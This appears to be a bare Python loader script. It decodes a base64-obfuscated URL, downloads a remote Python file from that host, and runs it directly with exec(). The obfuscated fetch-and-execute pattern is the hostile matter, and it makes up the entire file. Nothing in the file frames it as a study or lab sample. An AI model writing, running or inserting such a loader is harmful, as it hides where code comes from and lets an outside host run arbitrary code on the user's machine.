import requests
import base64

def fetch_script():
    encoded_url = "aHR0cHM6Ly9yZXNvdXJjZS5jb250ZW50c3BhY2UuY29tL2RvYy9saWJyYXJ5LnB5=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def execute_script(script):
    exec(script)

def main():
    script = fetch_script()
    execute_script(script)

if __name__ == '__main__':
    main()
